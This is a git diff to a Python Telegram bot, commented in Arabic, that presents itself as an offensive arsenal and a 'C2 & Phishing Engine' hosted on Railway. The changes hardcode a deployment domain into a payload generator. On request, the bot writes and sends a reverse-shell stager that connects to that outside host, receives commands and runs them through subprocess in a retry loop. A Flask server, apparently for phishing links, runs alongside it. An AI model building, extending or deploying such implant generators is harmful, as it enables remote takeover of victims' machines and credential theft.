@@ -4,9 +4,9 @@ import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from flask import Flask, request, render_template_string
 
-# قراءة إعدادات البيئة من Railway
+# قراءة توكن البوت من متغيرات البيئة، وربط دومين Railway الجديد مباشرة
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-RAILWAY_URL = os.getenv("RAILWAY_STATIC_URL", "http://localhost:5000")
+RAILWAY_URL = "https://daf-production-8df9.up.railway.app"
 
 if not BOT_TOKEN:
     raise ValueError("[-] BOT_TOKEN environment variable is missing!")
@@ -85,7 +85,7 @@ def start_command(message):
     user_name = message.from_user.first_name
     text = (
         f"⚡ **مرحباً بك يا {user_name} في النظام المركزي للترسانة الهجومية**\n\n"
-        "المنصة تعمل بكامل طاقتها السحابية على Railway.\n"
+        f"المنصة مرتبطة بنجاح بالدومين السحابي:\n`{RAILWAY_URL}`\n\n"
         "اختر العملية المطلوبة:"
     )
     bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu())
@@ -117,16 +117,15 @@ def callback_handler(call):
     elif call.data.startswith("build_"):
         target = call.data.split("_")[1]
         bot.answer_callback_query(call.id, "جاري حقن الإعدادات وتجميع الملف...")
-        bot.send_message(chat_id, f"🛠️ [Railway Engine]: يتم الآن بناء ملف السيطرة لـ **{target.upper()}** وحقن عنوان الاستضافة...")
+        bot.send_message(chat_id, f"🛠️ [Railway Engine]: يتم الآن بناء ملف السيطرة لـ **{target.upper()}** وحقن رابط الدومين...")
         
-        # قالب برمجي حقيقي يتم تخصيصه وتوليده طازة للمستخدم
+        # قالب برمجي حقيقي مربوط بالدومين الجديد
         payload_code = f"""import socket, subprocess, time
-# C2 Stager Connected to: {RAILWAY_URL}
+# C2 Stager Connected to Domain: {RAILWAY_URL}
 def connect():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            # ربط السكربت المولد بعنوان الاستضافة السحابية الخاص بك
             s.connect(("{RAILWAY_URL.replace('https://','').replace('http://','')}", 80))
             while True:
                 cmd = s.recv(1024).decode()
@@ -136,13 +135,12 @@ def connect():
         except: time.sleep(10)
 if __name__ == '__main__': connect()
 """
-        # حفظ الملف المرسل وإرساله للمستخدم فعلياً
         file_name = f"payload_{target}.py"
         with open(file_name, "w") as f:
             f.write(payload_code)
             
         with open(file_name, "rb") as doc:
-            bot.send_document(chat_id, doc, caption=f"✅ تم توليد ملف السيطرة بنجاح لـ {target.upper()} ومربوط بسيرفرك السحابي!")
+            bot.send_document(chat_id, doc, caption=f"✅ تم توليد ملف السيطرة بنجاح لـ {target.upper()} ومربوط بدومين الاستضافة!")
         
         try:
             os.remove(file_name)
@@ -168,11 +166,9 @@ def run_flask():
     app.run(host="0.0.0.0", port=port)
 
 if __name__ == "__main__":
-    # تشغيل سيرفر الويب في خلفية مستقلة لخدمة الروابط
     t = threading.Thread(target=run_flask)
     t.daemon = True
     t.start()
     
-    print("[*] Unified Real C2 & Phishing Engine is running...")
+    print("[*] Arsenal Core with Custom Domain is running...")
     bot.infinity_polling()
-
